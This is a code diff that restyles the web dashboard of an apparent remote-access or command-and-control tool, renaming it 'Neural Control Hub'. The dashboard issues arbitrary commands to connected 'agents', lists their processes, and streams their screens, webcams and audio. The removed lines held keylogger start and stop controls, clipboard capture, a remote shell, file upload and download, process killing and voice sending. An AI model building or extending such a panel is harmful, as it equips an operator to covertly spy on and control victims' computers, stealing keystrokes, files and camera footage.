@@ -17,99 +17,433 @@ DASHBOARD_HTML = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C2 Dashboard</title>
+    <title>Neural Control Hub</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; background-color: #f4f4f9; color: #333; margin: 0; padding: 20px; }
-        .container { max-width: 900px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        h1, h2 { color: #444; border-bottom: 2px solid #eee; padding-bottom: 10px; }
-        #agent-list { list-style-type: none; padding: 0; }
-        #agent-list li { background: #e9e9f3; margin-bottom: 10px; padding: 10px; border-radius: 5px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: background-color 0.2s; }
-        #agent-list li:hover { background: #dcdcf0; }
-        #agent-list li.selected { background: #6a5acd; color: white; }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; font-weight: bold; }
-        input[type="text"] { width: calc(100% - 22px); padding: 10px; border: 1px solid #ccc; border-radius: 4px; }
-        input[readonly] { background-color: #eee; }
-        button { background-color: #6a5acd; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; margin-right: 10px; }
-        button:hover { background-color: #5a4cad; }
-        #output-display { background: #222; color: #0f0; font-family: "Courier New", Courier, monospace; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; min-height: 100px; max-height: 400px; overflow-y: auto; }
-        .status { margin-top: 10px; padding: 10px; border-radius: 4px; }
-        .status.success { background-color: #d4edda; color: #155724; }
-        .status.error { background-color: #f8d7da; color: #721c24; }
-        #screen-capture { width: 100%; border: 1px solid #ccc; border-radius: 5px; margin-top: 10px; }
+        :root {
+            --primary-bg: #0a0a0f;
+            --secondary-bg: #1a1a2e;
+            --tertiary-bg: #16213e;
+            --accent-blue: #00d4ff;
+            --accent-purple: #6c5ce7;
+            --accent-green: #00ff88;
+            --accent-red: #ff4757;
+            --text-primary: #ffffff;
+            --text-secondary: #a0a0a0;
+            --border-color: #2d3748;
+            --glass-bg: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .neural-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(0, 212, 255, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(108, 92, 231, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(0, 255, 136, 0.05) 0%, transparent 50%);
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 30px 0;
+        }
+
+        .header h1 {
+            font-family: 'Orbitron', monospace;
+            font-size: 3rem;
+            font-weight: 900;
+            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 10px;
+            text-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
+        }
+
+        .header .subtitle {
+            font-size: 1.1rem;
+            color: var(--text-secondary);
+            font-weight: 300;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+
+        .panel {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .panel:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.4);
+        }
+
+        .panel-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .panel-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .panel-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+
+        .agent-grid {
+            display: grid;
+            gap: 12px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .agent-card {
+            background: var(--tertiary-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .agent-card:hover {
+            border-color: var(--accent-blue);
+            box-shadow: 0 4px 20px rgba(0, 212, 255, 0.2);
+        }
+
+        .agent-card.selected {
+            border-color: var(--accent-green);
+            background: rgba(0, 255, 136, 0.1);
+            box-shadow: 0 4px 20px rgba(0, 255, 136, 0.3);
+        }
+
+        .agent-status {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--accent-green);
+            box-shadow: 0 0 10px var(--accent-green);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .agent-id {
+            font-family: 'Orbitron', monospace;
+            font-weight: 600;
+            color: var(--accent-blue);
+            margin-bottom: 5px;
+        }
+
+        .agent-info {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+        }
+
+        .control-section {
+            display: grid;
+            gap: 20px;
+        }
+
+        .control-group {
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 15px;
+            padding: 20px;
+        }
+
+        .control-header {
+            font-family: 'Orbitron', monospace;
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--accent-blue);
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .neural-input {
+            width: 100%;
+            background: var(--tertiary-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 12px 16px;
+            color: var(--text-primary);
+            font-size: 0.95rem;
+            transition: all 0.3s ease;
+        }
+
+        .neural-input:focus {
+            outline: none;
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.1);
+        }
+
+        .neural-input[readonly] {
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text-secondary);
+        }
+
+        .btn {
+            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
+            border: none;
+            border-radius: 8px;
+            padding: 12px 24px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-right: 10px;
+            margin-bottom: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn-danger {
+            background: linear-gradient(45deg, var(--accent-red), #ff6b7a);
+        }
+
+        .btn-success {
+            background: linear-gradient(45deg, var(--accent-green), #2ed573);
+        }
+
+        .output-terminal {
+            background: #000;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 20px;
+            font-family: 'Courier New', monospace;
+            color: var(--accent-green);
+            min-height: 200px;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            position: relative;
+        }
+
+        .output-terminal::before {
+            content: "NEURAL_TERMINAL_v2.1 > ";
+            color: var(--accent-blue);
+            font-weight: bold;
+        }
+
+        .status-indicator {
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .status-success {
+            background: rgba(0, 255, 136, 0.2);
+            color: var(--accent-green);
+            border: 1px solid var(--accent-green);
+        }
+
+        .status-error {
+            background: rgba(255, 71, 87, 0.2);
+            color: var(--accent-red);
+            border: 1px solid var(--accent-red);
+        }
+
+        .no-agents {
+            text-align: center;
+            padding: 40px 20px;
+            color: var(--text-secondary);
+        }
+
+        .no-agents-icon {
+            font-size: 3rem;
+            margin-bottom: 15px;
+            opacity: 0.5;
+        }
+
+        /* Scrollbar Styling */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--primary-bg);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--accent-blue);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent-purple);
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .header h1 {
+                font-size: 2rem;
+            }
+        }
     </style>
 </head>
 <body>
+    <div class="neural-bg"></div>
+    
     <div class="container">
-        <h1>C2 Control Dashboard</h1>
-        
-        <h2>Active Agents</h2>
-        <ul id="agent-list"><li>No agents have checked in yet.</li></ul>
-
-        <h2>Agent Control</h2>
-        <div class="form-group">
-            <label for="agent-id">Selected Agent ID</label>
-            <input type="text" id="agent-id" readonly placeholder="Click on an agent from the list above">
+        <div class="header">
+            <h1>NEURAL CONTROL HUB</h1>
+            <p class="subtitle">Advanced Command & Control Interface</p>
         </div>
 
-        <div class="form-group">
-            <label for="command">Command to Execute</label>
-            <input type="text" id="command" placeholder="e.g., whoami">
-        </div>
-        <button onclick="issueCommand()">Issue Command</button>
-        <div id="command-status" class="status" style="display:none;"></div>
+        <div class="grid">
+            <!-- Agents Panel -->
+            <div class="panel">
+                <div class="panel-header">
+                    <div class="panel-icon">🔗</div>
+                    <div class="panel-title">Active Agents</div>
+                </div>
+                <div class="agent-grid" id="agent-list">
+                    <div class="no-agents">
+                        <div class="no-agents-icon">🤖</div>
+                        <div>No agents connected</div>
+                        <div style="font-size: 0.8rem; margin-top: 5px;">Waiting for neural links...</div>
+                    </div>
+                </div>
+            </div>
 
-        <h2>Command Output</h2>
-        <button onclick="getOutput()">Get Output for Selected Agent</button>
-        <pre id="output-display">Output will appear here...</pre>
+            <!-- Control Panel -->
+            <div class="panel">
+                <div class="panel-header">
+                    <div class="panel-icon">⚡</div>
+                    <div class="panel-title">Command Interface</div>
+                </div>
+                
+                <div class="control-section">
+                    <div class="control-group">
+                        <div class="control-header">Target Selection</div>
+                        <div class="input-group">
+                            <label class="input-label">Selected Agent</label>
+                            <input type="text" class="neural-input" id="agent-id" readonly placeholder="Select an agent from the left panel">
+                        </div>
+                    </div>
 
-        <h2>Screen Monitoring</h2>
-        <button onclick="startScreenStream()">Start Screen Stream</button>
-        <button onclick="startCameraStream()">Start Webcam Stream</button>
-        <button onclick="stopAllStreams()">Stop All Streams</button>
-        
-        <h2>File Management</h2>
-        <div class="form-group">
-            <label for="file-upload">Upload File to Agent</label>
-            <input type="file" id="file-upload" style="margin-bottom: 10px;">
-            <input type="text" id="upload-path" placeholder="Destination path on agent (e.g., C:\\temp\\file.txt)">
-            <button onclick="uploadFile()" style="margin-top: 10px;">Upload File</button>
-        </div>
-        <div class="form-group" style="margin-top: 15px;">
-            <label for="download-path">Download File from Agent</label>
-            <input type="text" id="download-path" placeholder="File path on agent (e.g., C:\\temp\\file.txt)">
-            <button onclick="downloadFile()" style="margin-top: 10px;">Download File</button>
-        </div>
+                    <div class="control-group">
+                        <div class="control-header">Command Execution</div>
+                        <div class="input-group">
+                            <label class="input-label">Command</label>
+                            <input type="text" class="neural-input" id="command" placeholder="Enter command to execute...">
+                        </div>
+                        <button class="btn" onclick="issueCommand()">Execute Command</button>
+                        <button class="btn btn-success" onclick="getOutput()">Retrieve Output</button>
+                        <div id="command-status" class="status-indicator"></div>
+                    </div>
 
-        <h2>Monitoring</h2>
-        <button onclick="startKeylogger()">Start Keylogger</button>
-        <button onclick="stopKeylogger()">Stop Keylogger</button>
-        <button onclick="getKeylogData()">Get Keylog Data</button>
-        <button onclick="startClipboardMonitor()">Start Clipboard Monitor</button>
-        <button onclick="stopClipboardMonitor()">Stop Clipboard Monitor</button>
-        <button onclick="getClipboardData()">Get Clipboard Data</button>
-
-        <h2>Remote Shell</h2>
-        <div class="form-group">
-            <label for="shell-command">Shell Command</label>
-            <input type="text" id="shell-command" placeholder="Enter command..." onkeypress="handleShellEnter(event)">
-            <button onclick="sendShellCommand()">Send</button>
-            <button onclick="clearShellOutput()">Clear</button>
-        </div>
-        <pre id="shell-output" style="background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; min-height: 200px; max-height: 400px; overflow-y: auto;">Remote shell output will appear here...</pre>
-
-        <h2>Voice Communication</h2>
-        <button id="voice-btn" onclick="toggleVoiceRecording()">Start Voice Recording</button>
-        <div id="voice-status" class="status" style="display:none;"></div>
-
-        <h2>Process Management</h2>
-        <button onclick="listProcesses()">List Running Processes</button>
-        <div class="form-group" style="margin-top: 15px;">
-            <label for="process-to-kill">Process Name or PID to Kill</label>
-            <input type="text" id="process-to-kill" placeholder="e.g., notepad or 1234">
-            <button onclick="killProcess()" style="margin-top: 10px;">Kill Process</button>
+                    <div class="control-group">
+                        <div class="control-header">Quick Actions</div>
+                        <button class="btn" onclick="listProcesses()">List Processes</button>
+                        <button class="btn" onclick="startScreenStream()">Screen Stream</button>
+                        <button class="btn" onclick="startCameraStream()">Camera Stream</button>
+                        <button class="btn btn-danger" onclick="stopAllStreams()">Stop All Streams</button>
+                    </div>
+                </div>
+            </div>
         </div>
 
+        <!-- Output Terminal -->
+        <div class="panel">
+            <div class="panel-header">
+                <div class="panel-icon">💻</div>
+                <div class="panel-title">Neural Terminal</div>
+            </div>
+            <div class="output-terminal" id="output-display">System ready. Awaiting commands...</div>
+        </div>
+
+        <!-- Hidden audio player for streams -->
         <audio id="audio-player" controls style="display:none; width: 100%; margin-top: 10px;"></audio>
     </div>
 
@@ -151,14 +485,13 @@ DASHBOARD_HTML = """
                 audioPlayer.src = '';
             }
 
-            document.querySelectorAll('#agent-list li').forEach(item => item.classList.remove('selected'));
+            document.querySelectorAll('.agent-card').forEach(item => item.classList.remove('selected'));
             element.classList.add('selected');
             
             selectedAgentId = agentId;
             document.getElementById('agent-id').value = agentId;
-            document.getElementById('output-display').textContent = 'Output will appear here...';
+            document.getElementById('output-display').textContent = 'Agent selected. Ready for commands...';
             document.getElementById('command-status').style.display = 'none';
-            
         }
 
         async function fetchAgents() {
@@ -169,28 +502,44 @@ DASHBOARD_HTML = """
                 agentList.innerHTML = '';
 
                 if (Object.keys(agents).length === 0) {
-                    agentList.innerHTML = '<li>No agents have checked in yet.</li>';
+                    agentList.innerHTML = `
+                        <div class="no-agents">
+                            <div class="no-agents-icon">🤖</div>
+                            <div>No agents connected</div>
+                            <div style="font-size: 0.8rem; margin-top: 5px;">Waiting for neural links...</div>
+                        </div>
+                    `;
                     return;
                 }
 
                 for (const agentId in agents) {
                     const agent = agents[agentId];
-                    const li = document.createElement('li');
-                    li.dataset.agentId = agentId;
-                    li.onclick = () => selectAgent(li, agentId);
+                    const agentCard = document.createElement('div');
+                    agentCard.className = 'agent-card';
+                    agentCard.onclick = () => selectAgent(agentCard, agentId);
                     
                     const lastSeen = agent.last_seen ? new Date(agent.last_seen).toLocaleString() : 'Never';
-                    li.innerHTML = `<strong>ID:</strong> ${agentId} <small><strong>Last Seen:</strong> ${lastSeen}</small>`;
+                    agentCard.innerHTML = `
+                        <div class="agent-status"></div>
+                        <div class="agent-id">${agentId.substring(0, 8)}...</div>
+                        <div class="agent-info">Last seen: ${lastSeen}</div>
+                    `;
                     
                     if (agentId === selectedAgentId) {
-                        li.classList.add('selected');
+                        agentCard.classList.add('selected');
                     }
                     
-                    agentList.appendChild(li);
+                    agentList.appendChild(agentCard);
                 }
             } catch (error) {
                 console.error('Error fetching agents:', error);
-                document.getElementById('agent-list').innerHTML = '<li>Error loading agents. Is the server running?</li>';
+                document.getElementById('agent-list').innerHTML = `
+                    <div class="no-agents">
+                        <div class="no-agents-icon">⚠️</div>
+                        <div>Connection Error</div>
+                        <div style="font-size: 0.8rem; margin-top: 5px;">Unable to reach control server</div>
+                    </div>
+                `;
             }
         }
 
@@ -198,8 +547,14 @@ DASHBOARD_HTML = """
             const command = document.getElementById('command').value;
             const statusDiv = document.getElementById('command-status');
 
-            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
-            if (!command) { alert('Please enter a command.'); return; }
+            if (!selectedAgentId) { 
+                showStatus('Please select an agent first.', 'error');
+                return; 
+            }
+            if (!command) { 
+                showStatus('Please enter a command.', 'error');
+                return; 
+            }
 
             // Clear any previous polling interval
             if (outputPollInterval) {
@@ -207,7 +562,7 @@ DASHBOARD_HTML = """
                 outputPollInterval = null;
             }
 
-            document.getElementById('output-display').textContent = 'Waiting for command output...';
+            document.getElementById('output-display').textContent = 'Executing command... Please wait.';
 
             try {
                 const response = await fetch('/issue_command', {
@@ -217,29 +572,27 @@ DASHBOARD_HTML = """
                 });
                 const result = await response.json();
                 
-                statusDiv.style.display = 'block';
                 if (response.ok) {
-                    statusDiv.className = 'status success';
-                    statusDiv.textContent = `Success: ${result.status}`;
+                    showStatus(`Command executed successfully`, 'success');
                     document.getElementById('command').value = '';
 
                     // Start polling for the output automatically
                     outputPollInterval = setInterval(getOutput, 3000); // Poll every 3 seconds
                 } else {
-                    statusDiv.className = 'status error';
-                    statusDiv.textContent = `Error: ${result.message}`;
+                    showStatus(`Error: ${result.message}`, 'error');
                 }
             } catch (error) {
-                statusDiv.style.display = 'block';
-                statusDiv.className = 'status error';
-                statusDiv.textContent = 'Network error. Could not issue command.';
+                showStatus('Network error. Could not issue command.', 'error');
                 console.error('Error issuing command:', error);
             }
         }
 
         async function getOutput() {
             const outputDisplay = document.getElementById('output-display');
-            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
+            if (!selectedAgentId) { 
+                showStatus('Please select an agent first.', 'error');
+                return; 
+            }
 
             try {
                 const response = await fetch(`/get_output/${selectedAgentId}`);
@@ -277,7 +630,10 @@ DASHBOARD_HTML = """
         }
 
         async function startScreenStream() {
-            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
+            if (!selectedAgentId) { 
+                showStatus('Please select an agent first.', 'error');
+                return; 
+            }
             
             // Tell the agent to start both video and audio streams
             await issueCommandInternal(selectedAgentId, 'start-stream'); // Screen stream
@@ -299,10 +655,15 @@ DASHBOARD_HTML = """
             audioPlayer.style.display = 'block';
             audioPlayer.src = audioUrl;
             audioPlayer.play();
+            
+            showStatus('Screen stream started', 'success');
         }
 
         async function startCameraStream() {
-            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
+            if (!selectedAgentId) { 
+                showStatus('Please select an agent first.', 'error');
+                return; 
+            }
 
             await issueCommandInternal(selectedAgentId, 'start-camera');
 
@@ -314,6 +675,8 @@ DASHBOARD_HTML = """
             const windowName = `CameraStream_${selectedAgentId}`;
             const windowFeatures = 'width=640,height=480,resizable=yes,scrollbars=no,status=no';
             cameraWindow = window.open(cameraUrl, windowName, windowFeatures);
+            
+            showStatus('Camera stream started', 'success');
         }
 
         async function stopAllStreams() {
@@ -336,6 +699,8 @@ DASHBOARD_HTML = """
                 cameraWindow.close();
                 cameraWindow = null;
             }
+            
+            showStatus('All streams stopped', 'success');
         }
 
         function listProcesses() {
@@ -343,24 +708,6 @@ DASHBOARD_HTML = """
             // Select Name, Id, and MainWindowTitle for a more informative process list.
             commandInput.value = 'Get-Process | Select-Object Name, Id, MainWindowTitle | Format-Table -AutoSize';
             issueCommand();
-        }
-
-        function killProcess() {
-            const processInput = document.getElementById('process-to-kill');
-            const target = processInput.value.trim();
-            if (!target) { alert('Please enter a process name or PID.'); return; }
-
-            let command = '';
-            // Check if target is purely numeric to decide between -Id and -Name
-            if (/^\d+$/.test(target)) {
-                command = `Stop-Process -Id ${target} -Force`;
-            } else {
-                command = `Stop-Process -Name "${target}" -Force`;
-            }
-            
-            document.getElementById('command').value = command;
-            issueCommand();
-            processInput.value = ''; // Clear the input after issuing
         }
 
         // Helper function to issue commands without showing status to the user (for internal tasks)
@@ -377,263 +724,16 @@ DASHBOARD_HTML = """
             }
         }
 
-        // File Management Functions
-        async function uploadFile() {
-            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('command-status');
+            statusDiv.style.display = 'block';
+            statusDiv.className = `status-indicator status-${type}`;
+            statusDiv.textContent = message;
             
-            const fileInput = document.getElementById('file-upload');
-            const pathInput = document.getElementById('upload-path');
-            
-            if (!fileInput.files[0]) { alert('Please select a file to upload.'); return; }
-            if (!pathInput.value) { alert('Please specify destination path.'); return; }
-            
-            const file = fileInput.files[0];
-            const formData = new FormData();
-            formData.append('file', file);
-            formData.append('agent_id', selectedAgentId);
-            formData.append('destination_path', pathInput.value);
-            
-            try {
-                const response = await fetch('/upload_file', {
-                    method: 'POST',
-                    body: formData
-                });
-                const result = await response.json();
-                
-                if (response.ok) {
-                    alert('File upload initiated successfully!');
-                    fileInput.value = '';
-                    pathInput.value = '';
-                } else {
-                    alert(`Upload failed: ${result.message}`);
-                }
-            } catch (error) {
-                alert('Network error during file upload.');
-                console.error('Upload error:', error);
-            }
+            setTimeout(() => {
+                statusDiv.style.display = 'none';
+            }, 3000);
         }
-
-        async function downloadFile() {
-            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
-            
-            const pathInput = document.getElementById('download-path');
-            if (!pathInput.value) { alert('Please specify file path to download.'); return; }
-            
-            try {
-                const response = await fetch('/download_file', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        agent_id: selectedAgentId, 
-                        file_path: pathInput.value 
-                    })
-                });
-                
-                if (response.ok) {
-                    const blob = await response.blob();
-                    const url = window.URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = pathInput.value.split('\\').pop().split('/').pop();
-                    document.body.appendChild(a);
-                    a.click();
-                    window.URL.revokeObjectURL(url);
-                    document.body.removeChild(a);
-                    pathInput.value = '';
-                } else {
-                    const result = await response.json();
-                    alert(`Download failed: ${result.message}`);
-                }
-            } catch (error) {
-                alert('Network error during file download.');
-                console.error('Download error:', error);
-            }
-        }
-
-        // Monitoring Functions
-        function startKeylogger() {
-            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
-            issueCommandInternal(selectedAgentId, 'start-keylogger');
-            alert('Keylogger started on agent.');
-        }
-
-        function stopKeylogger() {
-            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
-            issueCommandInternal(selectedAgentId, 'stop-keylogger');
-            alert('Keylogger stopped on agent.');
-        }
-
-        async function getKeylogData() {
-            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
-            
-            try {
-                const response = await fetch(`/get_keylog_data/${selectedAgentId}`);
-                const result = await response.json();
-                
-                if (response.ok && result.data) {
-                    document.getElementById('output-display').textContent = 'KEYLOG DATA:\n' + result.data;
-                } else {
-                    document.getElementById('output-display').textContent = 'No keylog data available.';
-                }
-            } catch (error) {
-                console.error('Error getting keylog data:', error);
-            }
-        }
-
-        function startClipboardMonitor() {
-            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
-            issueCommandInternal(selectedAgentId, 'start-clipboard');
-            alert('Clipboard monitoring started on agent.');
-        }
-
-        function stopClipboardMonitor() {
-            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
-            issueCommandInternal(selectedAgentId, 'stop-clipboard');
-            alert('Clipboard monitoring stopped on agent.');
-        }
-
-        async function getClipboardData() {
-            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
-            
-            try {
-                const response = await fetch(`/get_clipboard_data/${selectedAgentId}`);
-                const result = await response.json();
-                
-                if (response.ok && result.data) {
-                    document.getElementById('output-display').textContent = 'CLIPBOARD DATA:\n' + result.data;
-                } else {
-                    document.getElementById('output-display').textContent = 'No clipboard data available.';
-                }
-            } catch (error) {
-                console.error('Error getting clipboard data:', error);
-            }
-        }
-
-        // Remote Shell Functions
-        function handleShellEnter(event) {
-            if (event.key === 'Enter') {
-                sendShellCommand();
-            }
-        }
-
-        async function sendShellCommand() {
-            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
-            
-            const commandInput = document.getElementById('shell-command');
-            const command = commandInput.value.trim();
-            
-            if (!command) return;
-            
-            const shellOutput = document.getElementById('shell-output');
-            shellOutput.textContent += `> ${command}\n`;
-            
-            try {
-                const response = await fetch('/shell_command', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        agent_id: selectedAgentId, 
-                        command: command 
-                    })
-                });
-                const result = await response.json();
-                
-                if (response.ok) {
-                    shellOutput.textContent += result.output + '\n';
-                } else {
-                    shellOutput.textContent += `Error: ${result.message}\n`;
-                }
-                
-                shellOutput.scrollTop = shellOutput.scrollHeight;
-                commandInput.value = '';
-            } catch (error) {
-                shellOutput.textContent += 'Network error executing command.\n';
-                console.error('Shell command error:', error);
-            }
-        }
-
-        function clearShellOutput() {
-            document.getElementById('shell-output').textContent = 'Remote shell output will appear here...';
-        }
-
-        // Voice Communication Functions
-        let mediaRecorder;
-        let audioChunks = [];
-        let isRecording = false;
-
-        async function toggleVoiceRecording() {
-            const voiceBtn = document.getElementById('voice-btn');
-            const voiceStatus = document.getElementById('voice-status');
-            
-            if (!isRecording) {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    mediaRecorder = new MediaRecorder(stream);
-                    audioChunks = [];
-                    
-                    mediaRecorder.ondataavailable = event => {
-                        audioChunks.push(event.data);
-                    };
-                    
-                    mediaRecorder.onstop = async () => {
-                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
-                        await sendVoiceToAgent(audioBlob);
-                    };
-                    
-                    mediaRecorder.start();
-                    isRecording = true;
-                    voiceBtn.textContent = 'Stop Voice Recording';
-                    voiceStatus.style.display = 'block';
-                    voiceStatus.className = 'status success';
-                    voiceStatus.textContent = 'Recording... Click stop when finished.';
-                } catch (error) {
-                    voiceStatus.style.display = 'block';
-                    voiceStatus.className = 'status error';
-                    voiceStatus.textContent = 'Error accessing microphone.';
-                    console.error('Voice recording error:', error);
-                }
-            } else {
-                mediaRecorder.stop();
-                mediaRecorder.stream.getTracks().forEach(track => track.stop());
-                isRecording = false;
-                voiceBtn.textContent = 'Start Voice Recording';
-                voiceStatus.style.display = 'none';
-            }
-        }
-
-        async function sendVoiceToAgent(audioBlob) {
-            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
-            
-            const formData = new FormData();
-            formData.append('audio', audioBlob, 'voice.wav');
-            formData.append('agent_id', selectedAgentId);
-            
-            try {
-                const response = await fetch('/send_voice', {
-                    method: 'POST',
-                    body: formData
-                });
-                const result = await response.json();
-                
-                const voiceStatus = document.getElementById('voice-status');
-                voiceStatus.style.display = 'block';
-                if (response.ok) {
-                    voiceStatus.className = 'status success';
-                    voiceStatus.textContent = 'Voice message sent to agent successfully!';
-                } else {
-                    voiceStatus.className = 'status error';
-                    voiceStatus.textContent = `Failed to send voice: ${result.message}`;
-                }
-                
-                setTimeout(() => {
-                    voiceStatus.style.display = 'none';
-                }, 3000);
-            } catch (error) {
-                console.error('Error sending voice:', error);
-            }
-        }
-
-
 
         // Auto-refresh agents every 5 seconds
         setInterval(fetchAgents, 5000);
